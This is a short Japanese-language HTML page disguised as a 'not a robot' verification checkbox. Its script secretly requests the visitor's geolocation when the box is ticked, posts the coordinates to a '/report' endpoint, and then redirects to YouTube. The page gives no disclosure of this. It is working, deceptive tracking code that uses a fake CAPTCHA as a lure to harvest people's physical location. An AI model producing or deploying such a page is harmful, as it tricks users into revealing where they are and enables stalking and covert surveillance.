<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>ロボット確認</title>
</head>
<body style="text-align:center; margin-top:100px;">
  <h2>ロボットでないことを確認してください</h2>
  <input type="checkbox" id="check">
  <label for="check">私はロボットではありません</label>

  <script>
    document.getElementById('check').addEventListener('click', (e) => {
      if (e.target.checked) {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(pos => {
            fetch('/report', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude
              })
            }).then(() => {
              window.location.href = "https://www.youtube.com/";
            });
          }, err => {
            alert('位置情報が取得できませんでした。');
          });
        } else {
          alert('このブラウザでは位置情報が使用できません。');
        }
      }
    });
  </script>
</body>
</html>
